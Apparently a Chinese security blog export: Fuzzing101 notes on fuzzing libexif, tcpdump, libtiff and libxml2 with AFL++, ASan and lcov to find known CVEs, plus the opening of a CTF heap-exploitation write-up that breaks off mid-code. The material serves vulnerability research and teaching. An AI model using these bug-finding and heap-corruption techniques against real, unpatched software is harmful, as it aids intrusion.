<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">pwndbg</span></span><br><span class="line">   288 	data-&gt;size = size;</span><br><span class="line">   289 	data-&gt;data = exif_data_alloc (data, data-&gt;size);</span><br><span class="line">   290 	if (!data-&gt;data) </span><br><span class="line">   291 		return;</span><br><span class="line"> ► 292 	memcpy (data-&gt;data, d + offset, data-&gt;size);</span><br><span class="line">   293 &#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">bt</span></span><br><span class="line">0x000000000022efe5 in exif_data_load_data_thumbnail (data=0x452610, d=0x451e16 &quot;MM&quot;, ds=2026, offset=702, size=4294967168) at exif-data.c:292	# size=4294967168</span><br></pre></td></tr></table></figure>

<p>以下是<code>exif_data_load_data_thumbnail</code>函数的源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">exif_data_load_data_thumbnail</span> <span class="params">(ExifData *data, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *d,</span></span><br><span class="line"><span class="params">			       <span class="type">unsigned</span> <span class="type">int</span> ds, ExifLong offset, ExifLong size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// typedef uint32_t	ExifLong;          /* 4 bytes */</span></span><br><span class="line">	<span class="keyword">if</span> (ds &lt; offset + size) &#123;</span><br><span class="line">        <span class="comment">// 在这里，ds=2026, offset=702, size=0xFFFFFF80=-128，显然是可以通过检查的</span></span><br><span class="line">		exif_log (data-&gt;priv-&gt;<span class="built_in">log</span>, EXIF_LOG_CODE_DEBUG, <span class="string">&quot;ExifData&quot;</span>,</span><br><span class="line">			  <span class="string">&quot;Bogus thumbnail offset and size: %i &lt; %i + %i.&quot;</span>,</span><br><span class="line">			  (<span class="type">int</span>) ds, (<span class="type">int</span>) offset, (<span class="type">int</span>) size);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (data-&gt;data) </span><br><span class="line">		exif_mem_free (data-&gt;priv-&gt;mem, data-&gt;data);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    typedef struct _ExifData        ExifData; </span></span><br><span class="line"><span class="comment">    struct _ExifData</span></span><br><span class="line"><span class="comment">	&#123;</span></span><br><span class="line"><span class="comment">		ExifContent *ifd[EXIF_IFD_COUNT];</span></span><br><span class="line"><span class="comment">		unsigned char *data;</span></span><br><span class="line"><span class="comment">		unsigned int size;		// 问题就在此处</span></span><br><span class="line"><span class="comment">		ExifDataPrivate *priv;</span></span><br><span class="line"><span class="comment">	&#125;;</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	data-&gt;size = size;		<span class="comment">// 强制转换的时候出现了问题</span></span><br><span class="line">    <span class="comment">// size=0xFFFFFF80=4294967168</span></span><br><span class="line">	data-&gt;data = exif_data_alloc (data, data-&gt;size);</span><br><span class="line">	<span class="keyword">if</span> (!data-&gt;data) </span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	<span class="built_in">memcpy</span> (data-&gt;data, d + offset, data-&gt;size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以只需要更新一下这个检查就行：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span>) ds &lt; (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span>) offset + (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span>) size)&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>总结一下：不难发现，这两个洞都和<strong>整数溢出</strong>有关。</p>
<h2 id="Exercise-3：TCPdump"><a href="#Exercise-3：TCPdump" class="headerlink" title="Exercise 3：TCPdump"></a>Exercise 3：TCPdump</h2><p>简单来说，<code>TCPdump</code>就是一款Linux平台下的抓包工具。</p>
<p>CVE-2017-13028：存在一个越界读取的漏洞。</p>
<blockquote>
<p>原文链接：<a href="https://www.cvedetails.com/cve/CVE-2017-13028/">https://www.cvedetails.com/cve/CVE-2017-13028/</a></p>
</blockquote>
<h3 id="Fuzz准备-2"><a href="#Fuzz准备-2" class="headerlink" title="Fuzz准备"></a>Fuzz准备</h3><p>搭建环境：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd $HOME</span><br><span class="line">mkdir fuzzing_tcpdump &amp;&amp; cd fuzzing_tcpdump/</span><br><span class="line"></span><br><span class="line">wget https://www.tcpdump.org/release/tcpdump-4.9.2.tar.gz</span><br><span class="line">tar -xzvf tcpdump-4.9.2.tar.gz</span><br><span class="line"></span><br><span class="line">wget https://www.tcpdump.org/release/libpcap-1.8.0.tar.gz</span><br><span class="line">tar -xzvf libpcap-1.8.0.tar.gz</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编译 libpcap-1.8.0</span></span><br><span class="line">cd $HOME/fuzzing_tcpdump/libpcap-1.8.0/</span><br><span class="line">./configure --enable-shared=no</span><br><span class="line">make</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编译和安装 tcpdump-4.9.2</span></span><br><span class="line">cd $HOME/fuzzing_tcpdump/tcpdump-4.9.2/</span><br><span class="line">./configure --prefix=&quot;$HOME/fuzzing_tcpdump/install/&quot;</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">测试</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">HOME/fuzzing_tcpdump/install/sbin/tcpdump -h</span></span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">pursue@pursue-virtual-machine:~/fuzzing_tcpdump/install/sbin$ ./tcpdump -h</span><br><span class="line">tcpdump version 4.9.2</span><br><span class="line">libpcap version 1.8.0</span><br><span class="line">OpenSSL 3.0.2 15 Mar 2022</span><br><span class="line">Usage: tcpdump [-aAbdDefhHIJKlLnNOpqStuUvxX#] [ -B size ] [ -c count ]</span><br><span class="line">		[ -C file_size ] [ -E algo:secret ] [ -F file ] [ -G seconds ]</span><br><span class="line">		[ -i interface ] [ -j tstamptype ] [ -M secret ] [ --number ]</span><br><span class="line">		[ -Q in|out|inout ]</span><br><span class="line">		[ -r file ] [ -s snaplen ] [ --time-stamp-precision precision ]</span><br><span class="line">		[ --immediate-mode ] [ -T type ] [ --version ] [ -V file ]</span><br><span class="line">		[ -w file ] [ -W filecount ] [ -y datalinktype ] [ -z postrotate-command ]</span><br><span class="line">		[ -Z user ] [ expression ]</span><br></pre></td></tr></table></figure>

<p>接下来使用<code>ASan</code>对其编译，什么是<code>AddressSanitizer(ASan)</code>？原文给出了这样的解释：<code>AddressSanitizer (ASan)</code>是C和C++的快速内存错误检测器。它由编译器插装模块和运行库组成。该工具能够发现堆栈和全局对象的越界访问，以及释放后使用、双重释放和内存泄漏错误。<code>ASan</code>是开源的，从3.1版开始与LLVM编译器工具链集成。虽然它最初是作为LLVM的项目开发的，但它已被移植到GCC，并包含在GCC版本&gt;&#x3D; 4.8中。</p>
<blockquote>
<p>参考链接：<a href="https://clang.llvm.org/docs/AddressSanitizer.html">https://clang.llvm.org/docs/AddressSanitizer.html</a></p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rm -r $HOME/fuzzing_tcpdump/install</span><br><span class="line">cd $HOME/fuzzing_tcpdump/libpcap-1.8.0/</span><br><span class="line">make clean</span><br><span class="line"></span><br><span class="line">cd $HOME/fuzzing_tcpdump/tcpdump-4.9.2/</span><br><span class="line">make clean</span><br><span class="line"></span><br><span class="line">cd $HOME/fuzzing_tcpdump/libpcap-1.8.0/</span><br><span class="line">export LLVM_CONFIG=&quot;llvm-config-11&quot;</span><br><span class="line">CC=afl-clang-lto ./configure --enable-shared=no --prefix=&quot;$HOME/fuzzing_tcpdump/install/&quot;</span><br><span class="line">AFL_USE_ASAN=1 make</span><br><span class="line"></span><br><span class="line">cd $HOME/fuzzing_tcpdump/tcpdump-4.9.2/</span><br><span class="line">AFL_USE_ASAN=1 CC=afl-clang-lto ./configure --prefix=&quot;$HOME/fuzzing_tcpdump/install/&quot;</span><br><span class="line">AFL_USE_ASAN=1 make</span><br><span class="line">AFL_USE_ASAN=1 make install</span><br></pre></td></tr></table></figure>

<p>但是在编译完成之后，运行程序发现报错：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pursue@pursue-virtual-machine:~/桌面/Fuzzing101-main/Exercise 3/fuzzing_tcpdump/tcpdump-4.9.2$ ./tcpdump -h</span><br><span class="line">==59267==ERROR: AddressSanitizer failed to allocate 0x0 (0) bytes of SetAlternateSignalStack (error code: 22)</span><br><span class="line">==59267==Process memory map follows:</span><br><span class="line">	0x000000200000-0x0000003ac000	/home/pursue/桌面/Fuzzing101-main/Exercise 3/fuzzing_tcpdump/tcpdump-4.9.2/tcpdump</span><br><span class="line">	0x0000003ac000-0x00000086b000	/home/pursue/桌面/Fuzzing101-main/Exercise 3/fuzzing_tcpdump/tcpdump-4.9.2/tcpdump</span><br><span class="line">	0x00000086b000-0x000000870000	/home/pursue/桌面/Fuzzing101-main/Exercise 3/fuzzing_tcpdump/tcpdump-4.9.2/tcpdump</span><br><span class="line">	0x000000870000-0x000000998000	/home/pursue/桌面/Fuzzing101-main/Exercise 3/fuzzing_tcpdump/tcpdump-4.9.2/tcpdump</span><br><span class="line">	0x000000998000-0x0000015f6000	</span><br><span class="line">	0x00007fff7000-0x00008fff7000	</span><br><span class="line">	0x00008fff7000-0x02008fff7000	</span><br><span class="line">	0x02008fff7000-0x10007fff8000	</span><br><span class="line">	0x7f7b2d5fe000-0x7f7b2d962000	</span><br><span class="line">	0x7f7b2d962000-0x7f7b2d98a000	/usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">	0x7f7b2d98a000-0x7f7b2db1f000	/usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">	0x7f7b2db1f000-0x7f7b2db77000	/usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">	0x7f7b2db77000-0x7f7b2db7b000	/usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">	0x7f7b2db7b000-0x7f7b2db7d000	/usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">	0x7f7b2db7d000-0x7f7b2db8a000	</span><br><span class="line">	0x7f7b2db8a000-0x7f7b2db8d000	/usr/lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">	0x7f7b2db8d000-0x7f7b2dba4000	/usr/lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">	0x7f7b2dba4000-0x7f7b2dba8000	/usr/lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">	0x7f7b2dba8000-0x7f7b2dba9000	/usr/lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">	0x7f7b2dba9000-0x7f7b2dbaa000	/usr/lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">	0x7f7b2dbaa000-0x7f7b2dbb8000	/usr/lib/x86_64-linux-gnu/libm.so.6</span><br><span class="line">	0x7f7b2dbb8000-0x7f7b2dc34000	/usr/lib/x86_64-linux-gnu/libm.so.6</span><br><span class="line">	0x7f7b2dc34000-0x7f7b2dc8f000	/usr/lib/x86_64-linux-gnu/libm.so.6</span><br><span class="line">	0x7f7b2dc8f000-0x7f7b2dc90000	/usr/lib/x86_64-linux-gnu/libm.so.6</span><br><span class="line">	0x7f7b2dc90000-0x7f7b2dc91000	/usr/lib/x86_64-linux-gnu/libm.so.6</span><br><span class="line">	0x7f7b2dc91000-0x7f7b2dd43000	/usr/lib/x86_64-linux-gnu/libcrypto.so.3</span><br><span class="line">	0x7f7b2dd43000-0x7f7b2dfa0000	/usr/lib/x86_64-linux-gnu/libcrypto.so.3</span><br><span class="line">	0x7f7b2dfa0000-0x7f7b2e072000	/usr/lib/x86_64-linux-gnu/libcrypto.so.3</span><br><span class="line">	0x7f7b2e072000-0x7f7b2e0cd000	/usr/lib/x86_64-linux-gnu/libcrypto.so.3</span><br><span class="line">	0x7f7b2e0cd000-0x7f7b2e0d0000	/usr/lib/x86_64-linux-gnu/libcrypto.so.3</span><br><span class="line">	0x7f7b2e0d0000-0x7f7b2e0d3000	</span><br><span class="line">	0x7f7b2e0d9000-0x7f7b2e0e5000	</span><br><span class="line">	0x7f7b2e0e5000-0x7f7b2e0e7000	/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">	0x7f7b2e0e7000-0x7f7b2e111000	/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">	0x7f7b2e111000-0x7f7b2e11c000	/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">	0x7f7b2e11c000-0x7f7b2e11d000	</span><br><span class="line">	0x7f7b2e11d000-0x7f7b2e11f000	/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">	0x7f7b2e11f000-0x7f7b2e121000	/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">	0x7ffe26590000-0x7ffe265b1000	[stack]</span><br><span class="line">	0x7ffe265bf000-0x7ffe265c3000	[vvar]</span><br><span class="line">	0x7ffe265c3000-0x7ffe265c5000	[vdso]</span><br><span class="line">	0xffffffffff600000-0xffffffffff601000	[vsyscall]</span><br><span class="line">==59267==End of process memory map.</span><br><span class="line">==59267==AddressSanitizer CHECK failed: /build/llvm-toolchain-11-mnvtwk/llvm-toolchain-11-11.1.0/compiler-rt/lib/sanitizer_common/sanitizer_common.cpp:54 &quot;((0 &amp;&amp; &quot;unable to mmap&quot;)) != (0)&quot; (0x0, 0x0)</span><br><span class="line">    &lt;empty stack&gt;</span><br></pre></td></tr></table></figure>

<p><strong>原因是用的Ubuntu版本不对，错误是在Ubuntu22.04上出现的，而在Ubuntu20.04上正常。</strong></p>
<p>开始Fuzz：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo su</span><br><span class="line">echo core &gt;/proc/sys/kernel/core_pattern</span><br><span class="line">exit</span><br><span class="line"></span><br><span class="line">afl-fuzz -m none -i tcpdump-4.9.2/tests/ -o out/ -s 123 -- $HOME/fuzzing_tcpdump/install/sbin/tcpdump -vvvvXX -ee -nn -r @@</span><br></pre></td></tr></table></figure>



<h3 id="结果分析-2"><a href="#结果分析-2" class="headerlink" title="结果分析"></a>结果分析</h3><p>Fuzz的过程有点漫长，近乎跑了半天的程序。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230113105602933.png" alt="image-20230113105602933"></p>
<p>运行其中的一个crash样本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tcpdump-4.9.2/tcpdump -vvvvXX -ee -nn -r out/default/crashes/id:000000,sig:06,src:010739,time:56472860,execs:16241028,op:havoc,rep:8</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230113110117052.png" alt="image-20230113110117052"></p>
<h2 id="Exercise-4：LibTIFF"><a href="#Exercise-4：LibTIFF" class="headerlink" title="Exercise 4：LibTIFF"></a>Exercise 4：LibTIFF</h2><p><code>libtiff库</code>是读取和写入tiff文件最主要的一个开源库。</p>
<p>CVE-2016-9297：越界读取漏洞，可通过构建的<code>TIFF_SETGET_C16_ASCII</code>或<code>TIFF_SETGET_C32_ASCII</code>标记值触发。</p>
<blockquote>
<p>原文链接：<a href="https://cwe.mitre.org/data/definitions/125.html">https://cwe.mitre.org/data/definitions/125.html</a></p>
</blockquote>
<p>该挑战我们可以学习到：</p>
<ul>
<li>如何使用LCOV测量代码覆盖率</li>
<li>如何使用代码覆盖率数据来提高模糊测试的有效性</li>
</ul>
<p>代码覆盖率是一个软件指标，显示每行代码被触发的次数。通过使用代码覆盖率，我们将了解模糊器到达了代码的哪些部分，并可视化模糊处理过程。</p>
<h3 id="Fuzz准备-3"><a href="#Fuzz准备-3" class="headerlink" title="Fuzz准备"></a>Fuzz准备</h3><p>源码环境搭建：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install lcov</span><br><span class="line"></span><br><span class="line">cd $HOME</span><br><span class="line">mkdir fuzzing_tiff &amp;&amp; cd fuzzing_tiff/</span><br><span class="line"></span><br><span class="line">wget https://download.osgeo.org/libtiff/tiff-4.0.4.tar.gz</span><br><span class="line">tar -xzvf tiff-4.0.4.tar.gz</span><br><span class="line"></span><br><span class="line">cd tiff-4.0.4/</span><br><span class="line">export LDFLAGS=&quot;--coverage&quot;</span><br><span class="line">export CFLAGS=&quot;--coverage&quot;</span><br><span class="line">./configure --prefix=&quot;$HOME/fuzzing_tiff/install/&quot; --disable-shared</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<p>测试程序是否编译成功，这里加上各种参数是为了提高代码出现bug的机会：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">HOME/fuzzing_tiff/install/bin/tiffinfo -D -j -c -r -s -w <span class="built_in">test</span>/images/miniswhite-1c-1b.tiff</span></span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230111121333366.png" alt="image-20230111121333366"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd $HOME/fuzzing_tiff/tiff-4.0.4/</span><br><span class="line">lcov --zerocounters --directory ./		# 重置以前的计数器</span><br><span class="line">lcov --capture --initial --directory ./ --output-file app.info		# 返回“基线”覆盖数据文件，其中包含每个检测行的零覆盖率</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">HOME/fuzzing_tiff/install/bin/tiffinfo -D -j -c -r -s -w <span class="variable">$HOME</span>/fuzzing_tiff/tiff-4.0.4/test/images/palette-1c-1b.tiff</span></span><br><span class="line">lcov --no-checksum --directory ./ --capture --output-file app2.info		# 将当前覆盖状态保存到 app2.info 文件中</span><br><span class="line"></span><br><span class="line">genhtml --highlight --legend -output-directory ./html-coverage/ ./app2.info		# 通过html页面显示</span><br></pre></td></tr></table></figure>

<p><strong>注意：在该项目里必须要有<code>.gcno</code>文件才能够进行lcov，否则很有可能是编译失败了。</strong></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230111164840859.png" alt="image-20230111164840859"></p>
<p>html页面的路径为<code>./html-coverage/index.html</code>：</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230111165018618.png" alt="image-20230111165018618"></p>
<p>接下来进行插桩编译：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export LLVM_CONFIG=&quot;llvm-config-11&quot;</span><br><span class="line">export CC=afl-clang-lto</span><br><span class="line">./configure --prefix=&quot;$HOME/fuzzing_tiff/install/&quot; --disable-shared</span><br><span class="line">AFL_USE_ASAN=1 make</span><br><span class="line">AFL_USE_ASAN=1 make install</span><br></pre></td></tr></table></figure>

<p>开始Fuzz：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo su</span><br><span class="line">echo core &gt;/proc/sys/kernel/core_pattern</span><br><span class="line">exit</span><br><span class="line"></span><br><span class="line">afl-fuzz -m none -i tiff-4.0.4/test/images/ -o out/ -s 123 -- $HOME/fuzzing_tiff/install/bin/tiffinfo -D -j -c -r -s -w @@</span><br></pre></td></tr></table></figure>



<h3 id="结果分析-3"><a href="#结果分析-3" class="headerlink" title="结果分析"></a>结果分析</h3><p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230112175827228.png" alt="image-20230112175827228"></p>
<p>运行crash的实例就可以得到ASAN提示：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">HOME/fuzzing_tiff/install/bin/tiffinfo -D -j -c -r -s -w <span class="built_in">id</span>:000000,sig:06,src:000016,time:52157,execs:64042,op:havoc,rep:2</span></span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230112195957445.png" alt="image-20230112195957445"></p>
<ul>
<li>蓝色部分为读取操作，大概意思就是在线程为T0中，在<code>0x6020000000b1</code>处读取了大小为2的数据，并显示了函数栈的信息。</li>
<li>绿色部分为溢出的情况，其中还显示了堆块分配的函数栈。</li>
</ul>
<p>由于第一次阅读这样的ASAN报告，不是很熟练，所以对着CVE做了一下源码的分析，CVE告诉我们漏洞是通过<code>TIFF_SETGET_C16_ASCII</code>或<code>TIFF_SETGET_C32_ASCII</code>这两个标志触发的，发现在<code>tif_dirread.c</code>中出现，这里以后者举例：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> TIFF_SETGET_C32_ASCII:</span><br><span class="line">	&#123;</span><br><span class="line">		uint8* data;</span><br><span class="line">		assert(fip-&gt;field_readcount==TIFF_VARIABLE2);</span><br><span class="line">		assert(fip-&gt;field_passcount==<span class="number">1</span>);</span><br><span class="line">		err=TIFFReadDirEntryByteArray(tif,dp,&amp;data);</span><br><span class="line">		<span class="keyword">if</span> (err==TIFFReadDirEntryErrOk)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="type">int</span> m;</span><br><span class="line">			m=TIFFSetField(tif,dp-&gt;tdir_tag,(uint32)(dp-&gt;tdir_count),data);</span><br><span class="line">			<span class="keyword">if</span> (data!=<span class="number">0</span>)</span><br><span class="line">				_TIFFfree(data);</span><br><span class="line">			<span class="keyword">if</span> (!m)</span><br><span class="line">				<span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>这里<code>TIFFSetField()</code>函数的作用在官方文档的解释是根据引用或值获取标记值，对比一下<code>4.2.0</code>版本的源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> TIFF_SETGET_C32_ASCII:</span><br><span class="line">	&#123;</span><br><span class="line">		uint8* data;</span><br><span class="line">		assert(fip-&gt;field_readcount==TIFF_VARIABLE2);</span><br><span class="line">		assert(fip-&gt;field_passcount==<span class="number">1</span>);</span><br><span class="line">		err=TIFFReadDirEntryByteArray(tif,dp,&amp;data);</span><br><span class="line">		<span class="keyword">if</span> (err==TIFFReadDirEntryErrOk)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="type">int</span> m;</span><br><span class="line">			<span class="keyword">if</span>( data != <span class="number">0</span> &amp;&amp; dp-&gt;tdir_count &gt; <span class="number">0</span> &amp;&amp; data[dp-&gt;tdir_count<span class="number">-1</span>] != <span class="string">&#x27;\0&#x27;</span> )</span><br><span class="line">			&#123;</span><br><span class="line">			    TIFFWarningExt(tif-&gt;tif_clientdata,module,<span class="string">&quot;ASCII value for tag \&quot;%s\&quot; does not end in null byte. Forcing it to be null&quot;</span>,fip-&gt;field_name);</span><br><span class="line">                                          data[dp-&gt;tdir_count<span class="number">-1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			m=TIFFSetField(tif,dp-&gt;tdir_tag,(uint32)(dp-&gt;tdir_count),data);</span><br><span class="line">			<span class="keyword">if</span> (data!=<span class="number">0</span>)</span><br><span class="line">				_TIFFfree(data);</span><br><span class="line">			<span class="keyword">if</span> (!m)</span><br><span class="line">				<span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>很清楚，这里限制了<code>data</code>这个变量的最后一个字节必须为空字节，用<code>4.2.0</code>版本运行crash的样本，发现没有了ASAN的报告。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230112213219005.png" alt="image-20230112213219005"></p>
<h2 id="Exercise-5：LibXML2"><a href="#Exercise-5：LibXML2" class="headerlink" title="Exercise 5：LibXML2"></a>Exercise 5：LibXML2</h2><p>LibXML2是C语言的一个库，可以方便对XML文档的各种操作。</p>
<p>CVE-2017-9048：堆栈缓冲区溢出漏洞</p>
<p>在该挑战中我们可以学习到：</p>
<ul>
<li>使用自定义的字典帮助fuzzer找到新的执行路径</li>
<li>使用多核并行fuzzing提高效率</li>
</ul>
<blockquote>
<p>原文链接：<a href="https://nvd.nist.gov/vuln/detail/CVE-2017-9048">https://nvd.nist.gov/vuln/detail/CVE-2017-9048</a></p>
</blockquote>
<h3 id="Fuzz准备-4"><a href="#Fuzz准备-4" class="headerlink" title="Fuzz准备"></a>Fuzz准备</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd $HOME</span><br><span class="line">mkdir Fuzzing_libxml2 &amp;&amp; cd Fuzzing_libxml2</span><br><span class="line"></span><br><span class="line">wget http://xmlsoft.org/download/libxml2-2.9.4.tar.gz</span><br><span class="line">tar xvf libxml2-2.9.4.tar.gz &amp;&amp; cd libxml2-2.9.4/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">build libxml2</span></span><br><span class="line">sudo apt-get install python-dev</span><br><span class="line">export CC=afl-clang-lto </span><br><span class="line">export CXX=afl-clang-lto++ </span><br><span class="line">export CFLAGS=&quot;-fsanitize=address&quot; </span><br><span class="line">export CXXFLAGS=&quot;-fsanitize=address&quot; </span><br><span class="line">export LDFLAGS=&quot;-fsanitize=address&quot;</span><br><span class="line">AFL_USE_ASAN=1 ./configure --prefix=&quot;$HOME/Fuzzing_libxml2/libxml2-2.9.4/install&quot; --disable-shared --without-debug --without-ftp --without-http --without-legacy --without-python LIBS=&#x27;-ldl&#x27;</span><br><span class="line">AFL_USE_ASAN=1 make -j$(nproc)</span><br><span class="line">AFL_USE_ASAN=1 make install</span><br></pre></td></tr></table></figure>

<p>似乎编译的时间挺长，检查一下编译后的二进制文件</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230130194549115.png" alt="image-20230130194549115"></p>
<p>需要XML实例和字典</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir afl_in</span><br><span class="line">cp ./SampleInput.xml afl_in/</span><br><span class="line"></span><br><span class="line">mkdir dictionaries &amp;&amp; cd dictionaries</span><br><span class="line">wget https://github.com/AFLplusplus/AFLplusplus/blob/stable/dictionaries/xml.dict</span><br><span class="line">cd ..</span><br></pre></td></tr></table></figure>

<p>关于fuzz参数的使用</p>
<ul>
<li><code>-x</code>：标记使用的字典</li>
<li><code>-D</code>：表示启用了确定性突变</li>
<li><code>-M</code>：表示主模糊器</li>
<li><code>-S</code>：表示从模糊器</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">afl-fuzz -m none -i ./afl_in -o afl_out -s 123 -x ./dictionaries/xml.dict -D -M master -- ./libxml2-2.9.4/xmllint --memory --noenc --nocdata --dtdattr --loaddtd --valid --xinclude @@</span><br><span class="line"></span><br><span class="line">afl-fuzz -m none -i ./afl_in -o afl_out -s 234 -S slave1 -- ./libxml2-2.9.4/xmllint --memory --noenc --nocdata --dtdattr --loaddtd --valid --xinclude @@</span><br></pre></td></tr></table></figure>



<h3 id="结果分析-4"><a href="#结果分析-4" class="headerlink" title="结果分析"></a>结果分析</h3><p>暂时还未fuzz出结果</p>
]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>Fuzz</tag>
      </tags>
  </entry>
  <entry>
    <title>2022 祥云杯</title>
    <url>/2022/11/28/CTF/2022%E7%A5%A5%E4%BA%91%E6%9D%AF/</url>
    <content><![CDATA[<h2 id="bitheap"><a href="#bitheap" class="headerlink" title="bitheap"></a>bitheap</h2><p>漏洞在读取堆块内容时多了一个比特，为<code>off-by-one-bit</code>，这样我们就可以置堆块size的末尾为0，即上一个堆块处于释放状态，通过构造可以形成堆叠。由于涉及到二进制的读写，而且要考虑到<strong>小端序</strong>的问题，所以我们在写入的时候，<strong>需要从值的低位开始写</strong>。</p>
<p>先学习一下程序是怎么读写二进制的，在IDA中我们可以看到：</p>
<span id="more"></span>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_D60</span><span class="params">(__int64 ptr, __int64 size_1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 size; <span class="comment">// rax</span></span><br><span class="line">  __int64 i; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// edi</span></span><br><span class="line">  _BYTE *v6; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// cl</span></span><br><span class="line">  _BYTE v9[<span class="number">4104</span>]; <span class="comment">// [rsp+0h] [rbp-1028h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+1008h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  size = __read_chk(<span class="number">0LL</span>, v9, size_1, <span class="number">0x1008</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( size )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i != size; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = <span class="number">1</span> 